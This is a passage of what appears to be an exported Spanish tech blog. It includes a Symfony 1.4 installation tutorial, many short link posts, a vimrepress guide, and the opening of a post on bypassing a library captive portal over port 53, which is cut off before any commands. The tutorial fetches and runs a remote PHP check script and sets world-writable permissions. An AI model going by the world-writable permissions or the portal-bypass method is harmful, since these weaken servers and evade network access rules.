comprobar si todo está correctamente configurado y que cumplimos los requerimientos para Symfony, descargamos siguiente script y lo ejecutamos, pasando como parámetro la ruta al archivo php.ini que utiliza apache (por defecto, al ejecutarlo desde el terminal en lugar del navegador, utiliza otro archivo php.ini ): ```bash $ wget http://sf-to.org/1.4/check.php $ php --php-ini /etc/php5/apache2/php.ini check.php * * * * _ _ symfony requirements check _ _ * * * * php.ini used by PHP: /etc/php5/apache2/php.ini WARNING * The PHP CLI can use a different php.ini file * than the one used with your web server. * If this is the case, please launch this * utility from your web server. WARNING Mandatory requirements OK PHP version is at least 5.2.4 (5.3.2-1ubuntu4.15) Optional checks OK PDO is installed OK PDO has some drivers installed: mysql, sqlite, sqlite2 OK PHP-XML module is installed OK XSL module is installed OK The token_get_all() function is available OK The mb_strlen() function is available OK The iconv() function is available OK The utf8_decode() is available OK The posix_isatty() is available OK A PHP accelerator is installed OK php.ini has short_open_tag set to off OK php.ini has magic_quotes_gpc set to off OK php.ini has register_globals set to off OK php.ini has session.auto_start set to off OK PHP version is not 5.2.9 ``` Corregimos los errores que nos dé, si es que ya sea editando la configuración de php.ini o instalando paquetes que nos pudieran faltar (como, por ejemplo, php-xml-parser , php5-xsl o php-apc ). Si queremos, podemos copiar el archivo al DocumentRoot y abrirlo mediante el navegador, para estar seguros de que no hay ningún problema, y acto seguido lo borramos. Instalación Como hemos comentado al principio, colocaremos los ficheros de Symfony fuera del DocumentRoot . Crearemos el directorio para alojar los proyectos y, dentro de él, el directorio para el primer proyecto: bash $ mkdir -p /home/sfprojects/sfproject $ cd /home/sfprojects/sfproject Hay dos versiones principales de Symfony, la 1.4, versión estable con soporte hasta finales de este año, y la 2.0, que será la próxima versión principal. Utilizaremos la 1.4. A la hora de instalar Symfony, podemos hacerlo de forma global, para todo el sistema, o local, independiente para cada proyecto. La segunda es más recomendable, sobre todo si vamos a tener varios proyectos. De esta forma, la actualización de uno no afectará al resto. Se considera una buena práctica instalar Symfony en el directorio lib/vendor dentro del directorio raíz del proyecto, así que lo creamos primero: bash $ mkdir -p lib/vendor Instalaremos la versión estable actual de Symfony desde el repositorio subversion: bash $ svn checkout http://svn.symfony-project.com/tags/RELEASE_1_4_18 symfony Cuando salga una nueva versión, podremos actualizar cambiando simplemente la URL del repositorio. También podríamos utilizar la versión en desarrollo, con lo que incluiríamos las correcciones de errores con sólo actualizar la copia de trabajo. Creación de un proyecto Desde el directorio que habíamos creado para el proyecto, /home/sfprojects/sfproject , creamos el proyecto con Symfony, de nombre sfproject, mediante la tarea generate:project : bash $ cd /home/sfprojects/sfproject $ php lib/vendor/symfony/data/bin/symfony generate:project sfproject Esta tarea crea la estructura de directorios: bash apps/ Contiene las aplicaciones del proyecto cache/ Ficheros cacheados config/ Ficheros de configuración del proyecto data/ Ficheros con datos iniciales (fixtures) lib/ Bibliotecas y clases del proyecto log/ Ficheros de log plugins/ Plugins instalados test/ Ficheros con los tests unitarios y funcionales web/ El directorio raíz de la página web Cambiamos los permisos para los directorios cache y log . Estos son los únicos directorios en los que necesita escribir Symfony para comenzar: bash $ chmod 777 cache log La tarea, además, crea un acceso directo a lib/vendor/symfony/data/bin/symfony en el directorio del proyecto, para que sea más sencillo y rápido llamar al fichero. Para comprobar que la instalación es correcta, ejecutamos: bash $ ./symfony -V symfony version 1.4.18 (/home/sfproject/lib/vendor/symfony/lib) Nos aseguramos que en el archivo de configuración del proyecto, config/ProjectConfiguration.class.php , no hay una ruta absoluta sino relativa, con lo que podremos mover de lugar el directorio del proyecto sin que nada deje de funcionar: bash require_once dirname(__FILE__).'/../lib/vendor/symfony/lib/autoload/sfCoreAutoload.class.php'; Podemos ver una lista de opciones que nos ofrece el comando symfony , ejecutándolo sin ningún parámetro. Base de datos Antes de continuar, crearemos una base de datos específica para este proyecto y un usuario con privilegios únicamente para esta base de datos. Por ejemplo, si utilizamos MySQL: bash $ mysql -uroot -p mysql> CREATE DATABASE sfproject; mysql> CREATE USER 'sfproject'@'localhost' IDENTIFIED BY 'password'; mysql> GRANT ALL PRIVILEGES ON sfproject.* TO 'sfproject'@'localhost'; mysql> FLUSH PRIVILEGES; Symfony puede trabajar con diferentes bases de datos gracias a PDO (extensión para la abstracción de acceso a los datos). Para trabajar con PDO puede utilizaz dos herramientas: Doctrine, por defecto cuando creamos un proyecto, y Propel. Para configurar la base de datos ejecutamos: bash $ ./symfony configure:database \"mysql:host=localhost;dbname=sfproject\" sfproject password Si no queremos escribir la contraseña en el terminal, para que no quede registrada en el historial, podemos omitirla y luego editar el fichero config/databases.yml . Una razón para tener el directorio del proyecto fuera del DocumentRoot es evitar que este archivo llegue a ser accesible. Creación de una aplicación Para crear la aplicación frontend utilizaremos la tarea generate:app , desde el directorio raíz del proyecto: bash $ ./symfony generate:app frontend Esta tarea crea la siguiente estructura dentro del directorio apps/frontend : bash config/ Contiene los ficheros de configuración de la aplicación lib/ Contiene las bibliotecas y las clases de la aplicación modules/ Contiene el código de la aplicación (MVC) templates/ Contiene las plantillas globales Por defecto, Symfony nos protege de dos de las vulnerabilidades más extendidas en la web: XSS, escapando el contenido mostrado, y CSRF, creando un código CSRF aleatorio. Configuración del servidor En el DocumentRoot sólo deberían estar los ficheros que deban poder ser accedidos por el servidor web, como imágenes, hojas de estilo y Javascripts. Creamos el fichero de configuración del sitio, /etc/apache2/sites-available/sfproject.domain.tld : ```bash ServerName sfproject.domain.tld DocumentRoot \"/home/sfprojects/sfproject/web\" DirectoryIndex index.php AllowOverride All Allow from All Alias /sf /home/sfprojects/sfproject/lib/vendor/symfony/data/web/sf AllowOverride All Allow from All ``` Si no tenemos configurado el dominio sfproject.domain.tld, podemos crear un alias en el fichero /etc/hosts : bash 127.0.0.1 sfproject.domain.tld El alias sf sirve para acceder a las imágenes, hojas de estilo y Javascripts de Symfony, necesarios para mostrar correctamente las páginas por defecto. Activamos el sitio y reiniciamos apache: bash $ sudo a2ensite sfproject.domain.tld $ sudo apache2ctl restart Si todo ha ido bien, introducimos http://sfproject.domain.tld/index.php/ en el navegador y veremos el mensaje de bienvenido. Si tenemos activado mod_rewrite no será necesario poner index.php . Para acceder al entorno de desarrollo dela aplicación que hemos creado ponemos http://sfproject.domain.tld/frontend_dev.php/ . Entornos Dentro del directorio web/ hay dos ficheros PHP, index.php y frontend_dev.php . A estos ficheros se les llama front controllers . Todas las peticiones a la aplicación se hacen a través de ellos. Ambos apuntan a la misma aplicación, pero en diferentes entornos. Cuando se desarrolla una aplicación se necesitan varios entornos: desarrollo: utilizado por los programadores para añadir características, arreglar fallos, etc test: utilizado para realizar los tests de forma automática staging : utilizado por el cliente para probar la aplicación y reportar fallos o características que falten producción: utilizado por los usuarios finales Cada entorno tiene características diferentes. El de desarrollo está enfocado a los programadores, la aplicación registra todo tipo de detalles para facilitar la depuración, se deshabilita la caché para que los cambios tengan efecto de forma inmediata, cuando ocurre un error, Symfony muestra información detallada, etc. En producción, la caché está activada, se personalizan los mensajes de error y se optimiza para mejorar la experiencia de usuario. Referencias » Symfony: getting started","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/03/symfony-en-ubuntu-lucid-lynx-10-04/","loc":"https://karpoke.ignaciocano.com/2012/06/03/symfony-en-ubuntu-lucid-lynx-10-04/"},{"title":"Crash of the Titans Science Visualization","text":"This scientific visualization of a computer simulation depicts the inevitable collision between our Milky Way galaxy and the Andromeda galaxy (also known as Messier 31). NASA Hubble Space Telescope observations indicate that the two galaxies, pulled together by their mutual gravity, will crash together in a near-head-on collision about 4 billion years from now. The thin disk shapes of these spiral galaxies are strongly distorted and irrevocably transformed by the encounter. Around 6 billion years from now, the two galaxies will merge to form a single elliptical galaxy. » hubblesite.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/01/crash-of-the-titans-science-visualization/","loc":"https://karpoke.ignaciocano.com/2012/06/01/crash-of-the-titans-science-visualization/"},{"title":"Revistas y bases de datos on line sobre TIC y Educación","text":"Listado de aquellas publicaciones tanto de naturaleza académica y universitaria como divulgativa y profesional que son accesibles, de forma gratuita, a través de Internet, sobre estudios, ensayos, informes académicos sobre la temática de las aplicaciones educativas de las tecnologías digitales: el elearning o docencia virtual, los entornos personales del aprendizaje, la integración escolar de las TIC, los portafolios electrónicos, las redes sociales y el aprendizaje, la web 2.0 en educación, etcétera. Para confeccionar este índice de revistas he manejado dos bases de datos de publicaciones electrónicas: DOAJ Directory of Open Acces Journals Education y e-Revistas Plataforma Open Access de Revistas Científicas Electrónicas Españolas y Latinoamericanas. Y también, por supuesto, el buscador Google. » humanodigital.com.ar","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/31/revistas-y-bases-de-datos-on-line-sobre-tic-y-educacion/","loc":"https://karpoke.ignaciocano.com/2012/05/31/revistas-y-bases-de-datos-on-line-sobre-tic-y-educacion/"},{"title":"List of TCS conferences and workshops","text":"I would like to ask for help in compiling a list of as many TCS-related conferences and workshops as possible. My main motivation for doing this is to plan possible blog coverage of more theory venues -- finding correspondents attending these events who would be willing to write either brief or in-depth blog entries about events they are attending. Beyond that, I hope a list like this would give everyone a better sense of the lay of the theory land. » cstheory.stackexchange.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/30/list-of-tcs-conferences-and-workshops/","loc":"https://karpoke.ignaciocano.com/2012/05/30/list-of-tcs-conferences-and-workshops/"},{"title":"Protecting Your GNU/Linux System from Dropbox","text":"Typical blog posts about Dropbox security concentrate on data or network encryption. I want to talk about protecting your system from Dropbox the application, as well as Dropbox the company. In this blog post I tell you how to prepare for a theoretical scenario where Dropbox turns malicious. I've done a number of things to make Dropbox run in a much more secure fashion on my Ubuntu laptop. Hopefully I will introduce you to some vulnerabilities that you weren't aware of, and teach how to protect against them. Many of the attacks and defenses described here are portable to apps other than Dropbox. » grepular.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/30/protecting-your-gnulinux-system-from-dropbox/","loc":"https://karpoke.ignaciocano.com/2012/05/30/protecting-your-gnulinux-system-from-dropbox/"},{"title":"Django's CBVs were a mistake","text":"I've written before about the somewhat doubtful advantages of Class-Based Views. Since then, I've done more work as maintenance programmer on a Django project, and I've been reminded that library and framework design must take into account the fact that not all developers are experts. Even if you only hire the best, no-one can be an expert straight away. Thinking through things more from the perspective of a maintenance programmer, my doubts about CBVs have increased, to the point where I recently tweeted that CBVs were a mistake. So I thought I'd explain my reasons here. First, I'll look at the motivation behind CBVs, how they are doing at solving what they are supposed to solve, and then analyse the problems with them in terms of the Zen of Python. » lukeplant.me.uk","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/29/djangos-cbvs-were-a-mistake/","loc":"https://karpoke.ignaciocano.com/2012/05/29/djangos-cbvs-were-a-mistake/"},{"title":"Being exceptional","text":"Apparently, in Python, it is easier to ask for forgiveness rather than seek permission. That is to say, the normal approach when writing Python code is to assume that what you are trying to do will work properly. If something exceptional happens and the code doesn't work the way you were hoping, then the Python interpreter will tell you of the error so that you can handle that exceptional circumstance. This general approach, of trying to do something, then cleaning up if something goes wrong is acronymically called EAFP (\"easier to ask for forgiveness than permission\"). Brendan Scott | python4kids.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/29/being-exceptional/","loc":"https://karpoke.ignaciocano.com/2012/05/29/being-exceptional/"},{"title":"The History of Encryption","text":"» infografía | via cyberhades.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/28/the-history-of-encryption/","loc":"https://karpoke.ignaciocano.com/2012/05/28/the-history-of-encryption/"},{"title":"Applying Macrotypography For A More Readable Web Page","text":"Any application of typography can be divided into two arenas: micro and macro. Understanding the difference between the two is especially useful when crafting a reading experience, because it allows the designer to know when to focus on legibility and when to focus on readability. This article focuses mostly on a few simple macrotypographic techniques\"with a dash of micro\"and on how to combine them all to build a more harmonious, adaptable and, most importantly, readable Web page. » smashingmagazine.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/28/applying-macrotypography-for-a-more-readable-web-page/","loc":"https://karpoke.ignaciocano.com/2012/05/28/applying-macrotypography-for-a-more-readable-web-page/"},{"title":"¿Por qué usamos Linux?","text":"Le decimos a la gente que usamos Linux porque es seguro. O porque es libre, porque lo podemos adaptar a nuestras necesidades, porque es gratis, porque tiene un soporte excelente por parte de la comunidad... » wallbase.cc","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/27/por-que-usamos-linux/","loc":"https://karpoke.ignaciocano.com/2012/05/27/por-que-usamos-linux/"},{"title":"Por qué el lobby de los derechos de autor ama la pornografía infantil","text":"\"La pornografía infantil es genial,\" dijo entusiastamente el sujeto. \"Los políticos no entienden el intercambio de archivos, pero entienden la pornografía infantil, y la quieren filtrar para ganar puntos con el público. Una vez que los convenzamos de filtrar la pornografía infantil, podremos hacer que extiendan el bloqueo al intercambio de archivos.\" » falkvinge.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/27/por-que-el-lobby-de-los-derechos-de-autor-ama-la-pornografia-infantil/","loc":"https://karpoke.ignaciocano.com/2012/05/27/por-que-el-lobby-de-los-derechos-de-autor-ama-la-pornografia-infantil/"},{"title":"Interactive map of Linux kernel","text":"The interactive Linux kernel map helps you traverse complex interconnections between subsystems of the kernel while you explore its source code. A Linux hacker, trying to track down a bug or just understand how some subsystem works, can get exhausted just trying to figure out what invokes what \" so the kernel map comes to the rescue! » makelinux.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/27/interactive-map-of-linux-kernel/","loc":"https://karpoke.ignaciocano.com/2012/05/27/interactive-map-of-linux-kernel/"},{"title":"Why Nikola Testa was the greatest geek who ever lived","text":"» theoatmeal.com | Response to Forbes","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/27/why-nikola-testa-was-the-greatest-geek-who-ever-lived/","loc":"https://karpoke.ignaciocano.com/2012/05/27/why-nikola-testa-was-the-greatest-geek-who-ever-lived/"},{"title":"The Art of Computer Typography","text":"Ever since I came across Jürg Lehni's essay on typographic technology and digital fonts, Typeface As Programme, I've been fascinated with the story of Donald E. Knuth and his unexpected contributions to typography. @Jason Z. | 37signals.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/26/the-art-of-computer-typography/","loc":"https://karpoke.ignaciocano.com/2012/05/26/the-art-of-computer-typography/"},{"title":"Por qué me enamoré de los hackers","text":"Porque son gente lista y genial, de inacabable curiosidad, sentido del humor y vorazmente críticos, capaces de ponerlo todo patas arriba porque se les ocurrió una idea y con una ética colectiva que está cambiando el mundo. ¡Ah, no! ¿Que no es así como pensabas que eran los hackers? ¿Imaginabas unos tipos malvados, delincuentes habituales, sin empacho en asaltar tu ordenador y tu cuenta bancaria? ¿Esos de los que hablan día sí día también los medios y la policía, poniéndoles la etiqueta de \"hacker\"? @merce | grn.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/25/por-que-me-enamore-de-los-hackers/","loc":"https://karpoke.ignaciocano.com/2012/05/25/por-que-me-enamore-de-los-hackers/"},{"title":"DNS vs. large memory pages","text":"As everyone knows, an important threat against the Internet is that of a coordinated DDoS attack against the root TLD DNS servers. The way I\"d solve is with a simple inline device that both blocks some simple attacks from hitting the DNS server, but which can also answer simple queries, offloading the main server, even if it\"s failed. This can be done with \\$2000, half for the desktop machine, and the other half for the dual-port 10-gig Ethernet. » erratasec.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/25/dns-vs-large-memory-pages/","loc":"https://karpoke.ignaciocano.com/2012/05/25/dns-vs-large-memory-pages/"},{"title":"Imponiendo GPL; usando técnicas de Judo","text":"El propósito del software libre es hacer que el código que corre en las máquinas que gobiernan nuestras vidas sea transparente. En palabras de Lawrence Lessig, el software libre es \"libre en el sentido de que el control del código de desarrollo sea transparente para todos, y que cualquier persona tenga el derecho de tomar ese control, y modificarlo si él o ella cree conveniente.\" El mecanismo por el cual el software libre logra esto es el copyleft. El copyleft es un hack en el copyright (la ley de derechos de autor) que le quita los derechos exclusivos al titular del copyright y los comparte con el usuario, otorgándole el derecho de modificar, copiar, compartir y redistribuir el software, bajo la condición de que deben transferirse los mismos derechos a usuarios subsiguientes. \"Si uno usa y adapta un programa de software libre, y luego libera esa nueva versión adaptada para el público, debe ser tan libre como la versión original\". La GPL promueve los derechos del usuario, pero los defensores de esos derechos son los propietarios del copyright, que pueden ser los desarrolladores originales o cualquier otro organismo al que se le haya otorgado la propiedad del copyright. El beneficio para el titular del copyright es que el código está disponible para ser modificado y se puede retroalimentar progresivamente. El usuario gana dado que el código es transparente, y puede ser adaptado para mayores usos. Bradley Kuhn toma una analogía de las artes marciales, y dice que \"copyleft es una toma de judo sobre el copyright \". En el judo, el objetivo es aprovechar el impulso del atacante para defenderse, y eso es exactamente lo que hace copyleft. Mientras la ley de copyright se vuelve cada vez más y más amplia, el copyleft se sirve de ese impulso y lo devuelve con la misma fuerza. Por lo tanto el copyleft es siempre tan fuerte como el copyright. \" Traducción | elbauldelprogramador.com | Original h-online.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/24/imponiendo-gpl-usando-tecnicas-de-judo/","loc":"https://karpoke.ignaciocano.com/2012/05/24/imponiendo-gpl-usando-tecnicas-de-judo/"},{"title":"Monta tu propio DNS dinámico","text":"Ahora que todos los servicios tipo dyndns.org y no-ip.org se han vuelto de pago, echamos de menos un servicio de DNS dinámico que poder usar por poco dinero léase: gratis. La mala noticia es que no hay ninguno totalmente gratuito. La buena noticia es que, bajo ciertas circunstancias, podemos montarlo nosotros mismos. Roberto Suárez Soto | linuxtecnico.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/23/monta-tu-propio-dns-dinamico/","loc":"https://karpoke.ignaciocano.com/2012/05/23/monta-tu-propio-dns-dinamico/"},{"title":"Manual del perfecto conductor español","text":"En cierta ocasión se realizó una encuesta entre los conductores españoles que arrojó resultados sorprendentes. Aproximadamente el 95% de los conductores consideraba que conducía mejor que la media, lo que quiere decir que o bien el 5% conduce verdaderamente mal y en una escala del 1 al 10 puntúa negativo, o que en general el conductor español medio se mira por las mañanas ante el espejo de la bruja de Blancanieves. Personalmente me inclino por lo segundo. Más que nada porque el espejo me salió carísimo. En fin; pongámonos el traje de Antropólogo Indecente y vayamos a echarle un vistazo a la fauna que puebla la jungla de asfalto. » fronterasblog.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/23/manual-del-perfecto-conductor-espanol/","loc":"https://karpoke.ignaciocano.com/2012/05/23/manual-del-perfecto-conductor-espanol/"},{"title":"Caching Tutorial","text":"This is an informational document. Although technical in nature, it attempts to make the concepts involved understandable and applicable in real-world situations. Because of this, some aspects of the material are simplified or omitted, for the sake of clarity. If you are interested in the minutia of the subject, please explore the References and Further Information at the end. » mnot.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/23/caching-tutorial/","loc":"https://karpoke.ignaciocano.com/2012/05/23/caching-tutorial/"},{"title":"Can't Get Into Preprocessors? Try Zen Coding","text":"A ton of discussion lately has been given to preprocessors. These incredibly useful tools make coding easier, faster and more maintainable, but they're certainly not for everyone. Whether or not you've jumped on the preprocessor bandwagon, you should give a fresh look to an old favorite that helps you dramatically cut your coding time without reinventing your workflow with compilers and other complications: Zen Coding. » designhack.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/23/cant-get-into-preprocessors-try-zen-coding/","loc":"https://karpoke.ignaciocano.com/2012/05/23/cant-get-into-preprocessors-try-zen-coding/"},{"title":"Writing Plugins for gedit 3 with Python","text":"This is a guide to programming plugins for gedit 3, the default text editor for GNOME 3. gedit 3 uses the Libpeas GObject plugin system and the plugins can be written using C or Python. This guide will only cover writing plugins with Python. » micahcarrick.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/23/writing-plugins-for-gedit-3-with-python/","loc":"https://karpoke.ignaciocano.com/2012/05/23/writing-plugins-for-gedit-3-with-python/"},{"title":"Cables HDMI, la verdadera diferencia entre un cable caro y barato","text":"El uso de un cable HDMI permite transmitir una señal digital, señal de vídeo con mayor resolución, sonido multicanal en un sólo cable y la inclusión de datos auxiliares. Desde la versión HDMI 1.0 hasta la 1.4 se han ido añadiendo mejoras al cable. Por ejemplo, en la versión 1.4 se puede enviar una señal de vídeo a una resolución de 4096—2160 pixeles a 24fps o 3840—2160 a 30fps. Además permite enviar contenido 3D y junto a las mejoras de audio es capaz de enviar y recibir datos a través de una conexión Ethernet incorporada en el propio cable. » xakatahome.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/23/cables-hdmi-la-verdadera-diferencia-entre-un-cable-caro-y-barato/","loc":"https://karpoke.ignaciocano.com/2012/05/23/cables-hdmi-la-verdadera-diferencia-entre-un-cable-caro-y-barato/"},{"title":"Application Cache is a Douchebag","text":"Good morning! Over in \"castle Lanyrd\" we recently launched our mobile site, which caches data on events you're attending for viewing offline. I've boiled the offline bits down to a simple demo and posted all the code on Github. But before we delve into the code, let me tell you a true story. Totally true. » alistapart.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/22/application-cache-is-a-douchebag/","loc":"https://karpoke.ignaciocano.com/2012/05/22/application-cache-is-a-douchebag/"},{"title":"The UNIX System: Making Computers More Productive","text":"In the late 1960s, Bell Laboratories computer scientists Dennis Ritchie and Ken Thompson started work on a project that was inspired by an operating system called Multics, a joint project of MIT, GE, and Bell Labs. The host and narrator of this film, Victor Vyssotsky, also had worked on the Multics project. Ritchie and Thompson, recognizing some of the problems with the Multics OS, set out to create a more useful, flexible, and portable system for programmers to work with. » techchannel.att.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/21/the-unix-system-making-computers-more-productive/","loc":"https://karpoke.ignaciocano.com/2012/05/21/the-unix-system-making-computers-more-productive/"},{"title":"vimrepress, publicar en WordPress desde vim","text":"vimrepress es un complemento para trabajar con WordPress. Esta mañana he leído sobre él en el blog de CyberHades y me han entrado ganas de probarlo. Instalación Para que funcione, además de instalar el complemento deberemos activar el servicio XML-RPC en WordPress para publicar de forma remota. Para activarlo vamos a Ajustes > Escritura y marcamos la casilla XML-RCP. Ahora vamos a instalar el complemento. Descargamos la última versión estable, en estos momentos la 2.1.5, y la descomprimimos en el directorio ~/.vim : bash $ wget \"www.vim.org/scripts/download_script.php?src_id=16490\" -O vimpress-stable_2.1.5.zip $ unzip vimpress-stable_2.1.5.zip -d ~/.vim Añadimos al fichero de configuración de vim , ~/.vimrc : bash let VIMPRESS = [{'username': 'user', 'password': 'pass', 'blog_url': 'http://your-first-blog.com/' }, {'username': 'user', 'blog_url': 'http://your-second-blog.com/' }] Uso Algunos comandos que muestran cómo utilizar el complemento: ```bash :BlogList - Los 30 últimos artículos. :BlogList post 100 - 100 últimos artículos. :BlogList page - Las 30 últimas páginas. :BlogNew post - Añadir un artículo. :BlogNew page - Añadir una página. :BlogSave - Guardar (por defecto, como publicado). :BlogSave draft - Guardar como borrador. :BlogPreview local - Vista previa en local. :BlogPreview publish - Publicar y vista previa. :BlogOpen 679 :BlogOpen http://your-first-blog.com/archives/679 :BlogOpen http://your-second-blog.com/?p=679 :BlogOpen http://your-third-blog.com/with-your-custom-permalink ``` Para que funcione, además de instalar el complemento deberemos activar el servicio XML-RPC para publicar de forma remota. Para activarlo vamos a Ajustes > Escritura y Markdown Con vimpress podemos utilizar Markdown para escribir los artículos en lugar de hacerlo en HTML. Tendremos que tener instalado el paquete python-markdown . Un pequeño ejemplo de su sintaxis: # Título H1 ## Título H2 ### Título H3 _cursiva_ **negrita** ***negrita y cursiva*** texto del enlace = [texto del enlace](http://www.example.com) = ![texto alternativo de la imagen](http://www.example.com/image.png \"Título de la imagen\") enlace referenciado = [enlace referenciado][id] y en otra parte añadimos [id]: http://example.com/ \"Title\" Listado sin orden: \"- foo\" \"- bar\" Listado ordenado: \"1. primero\" \"2. segundo\" > cita > > cita anidada ``code`` Referencias » Vim, Markdown y WordPress » vimrepress » Markdown syntax » Markdown web dingus","tags":"dev","url":"https://karpoke.ignaciocano.com/2012/05/20/vimrepress-publicar-en-wordpress-desde-vim/","loc":"https://karpoke.ignaciocano.com/2012/05/20/vimrepress-publicar-en-wordpress-desde-vim/"},{"title":"12 resolutions for programmers","text":"It's important for programmers to challenge themselves. Creative and technical stagnation is the only alternative. In the spirit of the new year, I've compiled twelve month-sized resolutions. Each month is an annually renewable technical or personal challenge: Go analog. Stay healthy. Embrace the uncomfortable. Learn a new programming language. Automate. Learn more mathematics. Focus on security. Back up your data. Learn more theory. Engage the arts and humanities. Learn new software. Complete a personal project. Matt Might | matt.might.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/20/12-resolutions-for-programmers/","loc":"https://karpoke.ignaciocano.com/2012/05/20/12-resolutions-for-programmers/"},{"title":"Never use hard tabs","text":"As there seems to be some confusion when hard tab characters (ASCII code 9) are appropriate in source code files here is a rule: ​1) Never use hard tabs ​1. 1) Unless your source code is hard tab sensitive (only such format I know is Makefile) » opensourcehacker.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/20/never-use-hard-tabs/","loc":"https://karpoke.ignaciocano.com/2012/05/20/never-use-hard-tabs/"},{"title":"Vim: revisited","text":"I've had an off/on relationship with Vim for the past many years. Before, I never felt like we understood each other properly. I felt that the kind of programming I'm doing is not easily done without plugins and some essential settings in .vimrc, but fiddling with all the knobs and installing all the plugins that I thought I needed was a process that in the end stretched out from few hours to weeks, months even; and it the end it just caused frustration instead of making me a happier coder. Recently, I decided to give Vim another shot. This time around it was different – something in my brain switched and now for the first time in my life I'm proud of my knowledge of Vim. My philosophy of it has changed to \"less is more\", my approach was more disciplined and my motivation stronger. And so you don't spend as much time learning as I did, I am going to lay down some fundamentals. » mislav.uniqpath.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/20/vim-revisited/","loc":"https://karpoke.ignaciocano.com/2012/05/20/vim-revisited/"},{"title":"Seven habits of effective text editing","text":"If you spend a lot of time typing plain text, writing programs or HTML, you can save much of that time by using a good editor and using it effectively. This paper will present guidelines and hints for doing your work more quickly and with fewer mistakes. The open source text editor Vim (Vi IMproved) will be used here to present the ideas about effective editing, but they apply to other editors just as well. Choosing the right editor is actually the first step towards effective editing. The discussion about which editor is the best for you would take too much room and is avoided. If you don't know which editor to use or are dissatisfied with what you are currently using, give Vim a try; you won't be disappointed. » moolenaar.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/20/seven-habits-of-effective-text-editing/","loc":"https://karpoke.ignaciocano.com/2012/05/20/seven-habits-of-effective-text-editing/"},{"title":"How Linux is Built","text":"While Linux is running our phones, friend requests, tweets, financial trades, ATMs and more, most of us don't know how it's actually built. This short video takes you inside the process by which the largest collaborative development project in the history of computing is organized. Based on the annual report \"Who Writes Linux,\" this is a powerful and inspiring story of how Linux has become a community-driven phenomenon. More information about Linux and The Linux Foundation can be found at http://www.linuxfoundation.org and http://www.linux.com @TheLinuxFoundation | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/17/how-linux-is-built/","loc":"https://karpoke.ignaciocano.com/2012/05/17/how-linux-is-built/"},{"title":"Basics of Computational Number Theory","text":"This document is a gentle introduction to computational number theory. The plan of the paper is to first give a quick overview of arithmetic in the modular integers. Throughout, we will emphasize computation and practical results rather than delving into the why. Simple programs, generally in JavaScript, are available for all of the algorithms mentioned. At the end of the paper we will introduce the Gaussian Integers and Galois Fields and compare them to the modular integers. Companion papers will examine number theory from a more advanced perspective. » userpages.umbc.edu/\\~rcampbel","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/16/basics-of-computational-number-theory/","loc":"https://karpoke.ignaciocano.com/2012/05/16/basics-of-computational-number-theory/"},{"title":"Dario Taraborelli: The Beauty of LaTeX","text":"There are several reasons why one should prefer LaTeX to a WYSIWYG word processor like Microsoft Word: portability, lightness, security are just a few of them (not to mention that LaTeX is free). There is still a further reason that definitely convinced me to abandon MS Word when I wrote my dissertation: you will never be able to produce professionally typeset and well-structured documents using most WYSIWYG word processors. LaTeX is a free typesetting system that allows you to focus on content without bothering about the layout: the software takes care of the actual typesetting, structuring and page formatting, producing documents of astonishing elegance. » nitens.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/16/dario-taraborelli-the-beauty-of-latex/","loc":"https://karpoke.ignaciocano.com/2012/05/16/dario-taraborelli-the-beauty-of-latex/"},{"title":"Augmented reality sandbox with real-time water flow simulation","text":"Video of a sandbox equipped with a Kinect 3D camera and a projector to project a real-time colored topographic map with contour lines onto the sand surface. The sandbox lets virtual water flow over the surface using a GPU-based simulation of the Saint-Venant set of shallow water equations. @okreylos | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/16/augmented-reality-sandbox-with-real-time-water-flow-simulation/","loc":"https://karpoke.ignaciocano.com/2012/05/16/augmented-reality-sandbox-with-real-time-water-flow-simulation/"},{"title":"La escala del universo","text":"» link | via reddit","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/05/15/la-escala-del-universo/","loc":"https://karpoke.ignaciocano.com/2012/05/15/la-escala-del-universo/"},{"title":"Saltándonos el portal cautivo de una biblioteca","text":"El portal cautivo es el sistema que utilizan algunos establecimientos como bibliotecas u hoteles en el que la conexión inalámbrica está abierta (sin cifrar) pero para conectarse a Internet es necesario aceptar las condiciones de uso, o introducir una contraseña, en la página de pasarela que aparece cuando intentamos navegar. Este no es un artículo exhaustivo que muestre como saltarse cualquier portal cautivo sino más bien aquél que permite el paso de tráfico TCP por el puerto 53 (DNS). Lo que veremos aquí NO es un túnel DNS, que permite encapsular el tráfico TCP en paquetes de DNS. Además, necesitaremos tener acceso a un equipo remoto con el servicio de SSH y en el que esté redirigido el puerto externo 53 (DNS) al puerto del equipo interno donde corre SSH. En muchas 